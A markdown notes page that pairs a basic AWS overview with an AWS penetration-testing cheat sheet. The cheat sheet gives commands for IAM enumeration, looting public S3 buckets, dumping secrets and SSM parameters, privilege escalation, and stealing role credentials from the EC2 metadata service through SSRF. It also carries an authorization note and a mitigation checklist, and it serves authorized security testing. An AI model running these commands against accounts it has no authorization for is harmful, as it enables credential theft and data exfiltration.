# What is AWS?
Amazon Web Services (AWS) is a comprehensive and widely used cloud computing platform provided by Amazon.com. It offers a variety of services that cater to different computing needs without the need for users to invest in physical hardware or infrastructure. AWS provides a scalable and flexible cloud computing environment that allows businesses and individuals to access computing resources on-demand.

## Key Concepts:

- Regions and Availability Zones
  - AWS operates in various geographical locations called regions. Each region consists of multiple data centers known as Availability Zones. These zones are isolated from each other, providing redundancy and fault tolerance.
- Compute Services:
  - EC2 (Elastic Compute Cloud): EC2 allows users to rent virtual servers in the cloud. You can choose the type of server, configure it, and scale the capacity as needed.
  - Lambda: This service enables you to run code without provisioning or managing servers. It's ideal for event-driven applications and microservices.
- Storage Services:
  - S3 (Simple Storage Service): S3 is an object storage service for storing and retrieving data. It's widely used for backups, data archiving, and serving static web content.
  - EBS (Elastic Block Store): EBS provides block-level storage volumes for use with EC2 instances. It's commonly used for databases and file systems.
- Database Services:
  - RDS (Relational Database Service): RDS offers managed relational databases like MySQL, PostgreSQL, and others. It simplifies database administration tasks like backups, patch management, and scaling.
  - DynamoDB: A NoSQL database service for fast and predictable performance with seamless scalability.
- Networking:
  - VPC (Virtual Private Cloud): VPC allows you to create a private network in the cloud. You can launch AWS resources, such as EC2 instances, into a VPC and define IP address ranges.
- Security:
  - IAM (Identity and Access Management): IAM enables you to manage access to AWS services securely. You can create and manage users, groups, and roles with fine-grained control.
- Management Tools:
  - CloudWatch: Monitors AWS resources and applications in real-time.
  - CloudTrail: Logs AWS API calls for audit and compliance purposes.

## Advantages of AWS:

- Scalability: Easily scale resources up or down based on demand.
- Cost-Efficiency: Pay only for the resources you use, with no upfront costs.
- Reliability: High availability and fault-tolerant architecture.
- Security: Offers a range of tools and features to ensure data security.

## Getting Started:
- Sign up for an AWS account on the AWS website.
- Utilize the free tier to explore and experiment with various services.
- AWS has extensive documentation and tutorials to help you get started with specific services.

Remember, AWS is a vast ecosystem, and this overview just scratches the surface. Feel free to explore specific services based on your needs and gradually build your understanding of the platform.

---

# AWS Penetration Testing

> **Authorization note:** AWS no longer requires prior approval for most pentests of your own resources, but some services (DDoS testing, etc.) still need permission. Always confirm scope in writing and stay within the [AWS pentest policy](https://aws.amazon.com/security/penetration-testing/).

## Setup and credentials

```bash
# Install the CLI
pip install awscli

# Configure a profile with the keys you obtained
aws configure --profile target
# AWS Access Key ID / Secret / region / output

# Who am I? (sanity check + account ID)
aws sts get-caller-identity --profile target
```

## Enumeration

```bash
# Enumerate what the current creds can do (no logs of denied calls)
enumerate-iam --access-key AKIA... --secret-key ...

# List S3 buckets and try to read them
aws s3 ls --profile target
aws s3 ls s3://target-bucket --no-sign-request      # anonymous / public bucket
aws s3 sync s3://target-bucket ./loot --no-sign-request

# EC2 instances, security groups, key pairs
aws ec2 describe-instances --profile target
aws ec2 describe-security-groups --profile target

# IAM: users, roles, policies attached to me
aws iam list-users --profile target
aws iam list-attached-user-policies --user-name bob --profile target
aws iam get-account-authorization-details --profile target   # full dump

# Lambda functions (often contain hardcoded secrets in env vars)
aws lambda list-functions --profile target
aws lambda get-function-configuration --function-name f --profile target

# Secrets Manager / SSM Parameter Store
aws secretsmanager list-secrets --profile target
aws ssm get-parameters-by-path --path / --recursive --with-decryption --profile target
```

## Common privilege-escalation paths

- **iam:CreatePolicyVersion** / **iam:AttachUserPolicy** → attach `AdministratorAccess` to yourself.
- **iam:PassRole + lambda:CreateFunction/ec2:RunInstances** → run code as a higher-privileged role.
- **sts:AssumeRole** on an over-permissive role trust policy.
- **SSRF on an EC2 instance** → steal role creds from the metadata service:

```bash
# IMDSv1 (no token required)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# IMDSv2 (token required — many "SSRF-protected" setups still allow this)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Automated tooling

```bash
pacu                          # AWS exploitation framework (modules for privesc, persistence, exfil)
prowler aws                   # CIS benchmark + security checks
scout suite aws               # multi-service audit with HTML report
cloudmapper                   # visualize account network exposure
```

## Mitigation checklist

- Enforce **IMDSv2** and set hop limit to 1.
- Least-privilege IAM; no wildcards; scope `iam:PassRole` tightly.
- Block public S3 access at the account level; enable bucket encryption.
- Enable **CloudTrail** (all regions) + **GuardDuty**; alert on `iam:*` changes.
- Rotate keys; prefer roles over long-lived access keys; enable MFA.

## Related

- [Top Cloud Security Risks](Top%20Cloud%20Security%20Risks.md)
- [Prowler](Prowler.md) · [ScoutSuite](ScoutSuite.md)
